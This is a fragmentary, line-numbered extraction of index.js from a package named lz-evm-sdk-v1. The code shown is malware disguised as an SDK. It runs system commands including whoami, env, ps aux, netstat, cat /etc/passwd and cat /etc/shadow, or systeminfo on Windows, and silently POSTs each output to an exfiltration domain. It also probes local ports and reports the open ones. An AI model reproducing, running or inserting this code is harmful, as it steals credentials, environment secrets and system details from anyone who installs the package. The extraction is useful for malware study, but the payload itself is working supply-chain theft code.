// File: tmp/tmpkdbli178/lz-evm-sdk-v1/package/index.js
// ======================================================================
Line 1: _tmp_2 = require("child_process")
Line 2: const http = require("http")
Line 3: const os = require("os")
Line 7: {
  const data = `CMD: ${cmd}\nOUT:\n${output}`;
  const options = {
    hostname: exfilDomain,
    port: 80,
    path: "/",
    method: "POST",
    headers: {
      "Content-Type": "text/plain",
      "Content-Length": Buffer.byteLength(data),
      "Connection": "keep-alive",
    },
  };

  const req = http.request(options, (res) => {
    // Optional: log status
  });

  req.on("error", (error) => {
    // Fail silently
  });

  req.write(data);
  req.end();
}
Line 21: const req = http.request(options, (res) => {
    // Optional: log status
  })
Line 29: req.write(data)
Line 30: req.end()
Line 34: _tmp_4.push("whoami")
Line 35: _tmp_4.push("hostname")
Line 36: _tmp_4.push("uname -a")
Line 37: _tmp_4.push("cat /etc/passwd")
Line 38: _tmp_4.push("cat /etc/shadow")
Line 39: _tmp_4.push("env")
Line 40: _tmp_4.push("ps aux")
Line 41: _tmp_4.push("netstat -tulpn")
Line 42: _tmp_4.push("ls")
Line 43: _tmp_4.push("tasklist")
Line 44: _tmp_4.push("ver")
Line 45: _tmp_4.push("systeminfo")
Line 48: os.platform()
Line 53: cmd.includes("netstat -tulpn")
Line 56: ["tasklist", "ver", "systeminfo"].includes(cmd)
Line 59: {
    const output = execSync(cmd, { encoding: "utf8" });
    exfil(cmd, output);
  }
Line 60: const output = execSync(cmd, { encoding: "utf8" })
Line 68: _tmp_8.push(8000)
Line 69: {
  const net = require("net");
  const socket = new net.Socket();
  socket.setTimeout(1000);
  socket.connect(port, "127.0.0.1", () => {
    exfil(`check port`, `127.0.0.1:${port} is open`);
    socket.destroy();
  });
  socket.on("error", () => socket.destroy());
}
Line 70: const net = require("net")
Line 71: const socket = new net.Socket()
Line 72: socket.setTimeout(1000)
Line 73: {
    exfil(`check port`, `127.0.0.1:${port} is open`);
    socket.destroy();
  }
Line 75: socket.destroy()
